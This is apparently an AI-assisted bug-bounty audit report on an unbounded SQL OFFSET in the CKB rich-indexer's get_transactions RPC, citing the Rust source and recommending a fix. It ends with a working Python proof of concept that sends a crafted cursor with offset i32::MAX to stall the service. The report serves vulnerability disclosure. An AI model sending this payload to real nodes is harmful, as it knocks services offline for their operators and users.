All cited code references check out against the actual source. Let me verify the key claims:

- `decode_i32` (lines 286–294): only a length check, no range validation. [1](#0-0) 
- `query_builder.offset(offset)` at line 181: decoded offset passed verbatim. [2](#0-1) 
- `request_limit` guard at lines 27–32: bounds only `limit`, not `offset`. [3](#0-2) 
- WHERE clause at line 171: `tx_id >= last`, so `last=0` matches all rows. [4](#0-3) 

---

Audit Report

## Title
Unbounded SQL OFFSET via Crafted Pagination Cursor Causes Rich-Indexer RPC DoS — (File: `util/rich-indexer/src/indexer_handle/async_indexer_handle/get_transactions.rs`)

## Summary
The `get_transactions` RPC endpoint (when `group_by_transaction` is `false` or `None`) decodes the last 4 bytes of a 12-byte `after` cursor as an `i32` offset and passes it directly to `query_builder.offset(offset)` with no bounds validation. An unauthenticated caller can craft a cursor with `tx_id=0` and `offset=i32::MAX`, forcing the database to scan through up to 2,147,483,647 rows before returning any results, making the rich-indexer RPC unresponsive on a populated database.

## Finding Description
In `get_transactions` (lines 44–53), the 12-byte cursor is split: bytes 0–7 → `tx_id` (i64 LE), bytes 8–11 → `offset` (i32 LE). The `decode_i32` helper (`mod.rs`, lines 286–294) performs only a 4-byte length check — no range or sanity validation on the decoded value. The decoded `offset` is then passed verbatim to `query_builder.offset(offset)` at line 181. The WHERE clause at line 171 adds `tx_id >= last`; with `last=0` this matches every row in the table. The resulting SQL becomes:

```sql
SELECT ... WHERE tx_id >= 0 ORDER BY tx_id ASC LIMIT <N> OFFSET 2147483647
```

The existing `request_limit` guard (lines 27–32) only bounds the `limit` parameter (number of returned rows) and has no effect on the offset. There is no per-IP rate limiting, authentication, or PoW requirement on the RPC endpoint.

## Impact Explanation
A single unauthenticated RPC call forces the database to scan all matching rows up to the offset before returning results. On a populated rich-indexer database, repeated calls exhaust CPU and I/O, making the rich-indexer RPC completely unresponsive. This matches the allowed CKB bounty impact: **Note (0–500 points) — Any local RPC API crash**. The core CKB node (consensus, P2P) is not directly affected since the rich-indexer is an optional component, capping the severity at Note level.

## Likelihood Explanation
The rich-indexer JSON-RPC port is reachable by any caller with network access to the node. No authentication, proof-of-work, or privileged role is required. The 12-byte cursor format is trivially constructable from the documented structure. The attack is repeatable and requires only a single HTTP POST per invocation.

## Recommendation
Validate the decoded offset against a sane upper bound before use — for example, reject if `offset > self.request_limit as i32` or `offset > some_configured_max_page_size`. The more robust fix is to redesign the cursor to use keyset-only pagination (store `tx_id` + `io_index` as a tie-breaker) and eliminate the SQL `OFFSET` entirely, which is the standard approach for scalable cursor-based pagination and removes this attack surface completely.

## Proof of Concept
```python
import struct, json, requests

# tx_id = 0 (matches all rows), offset = i32::MAX
cursor = struct.pack('<q', 0) + struct.pack('<i', 2_147_483_647)
after_hex = "0x" + cursor.hex()

payload = {
    "jsonrpc": "2.0", "id": 1,
    "method": "get_transactions",
    "params": [
        {"script": {"code_hash": "0x" + "00"*32, "hash_type": "data", "args": "0x"},
         "script_type": "lock"},
        "asc", "0x1",
        after_hex
    ]
}
# Against a node with a populated rich-indexer DB, this call will hang for an extended period.
r = requests.post("http://localhost:8116", json=payload, timeout=300)
print(r.json())
```

### Citations

**File:** util/rich-indexer/src/indexer_handle/async_indexer_handle/mod.rs (L286-294)
```rust
fn decode_i32(data: &[u8]) -> Result<i32, Error> {
    if data.len() != 4 {
        return Err(Error::Params(
            "unable to convert from bytes to i32 due to insufficient data in little-endian format"
                .to_string(),
        ));
    }
    Ok(i32::from_le_bytes(to_fixed_array(&data[0..4])))
}
```

**File:** util/rich-indexer/src/indexer_handle/async_indexer_handle/get_transactions.rs (L27-32)
```rust
        if limit as usize > self.request_limit {
            return Err(Error::invalid_params(format!(
                "limit must be less than {}",
                self.request_limit,
            )));
        }
```

**File:** util/rich-indexer/src/indexer_handle/async_indexer_handle/get_transactions.rs (L169-173)
```rust
    if let Some((last, _)) = last_cursor {
        match order {
            IndexerOrder::Asc => query_builder.and_where_ge("tx_id", last),
            IndexerOrder::Desc => query_builder.and_where_le("tx_id", last),
        };
```

**File:** util/rich-indexer/src/indexer_handle/async_indexer_handle/get_transactions.rs (L180-182)
```rust
    if let Some((_, offset)) = last_cursor {
        query_builder.offset(offset);
    }
```
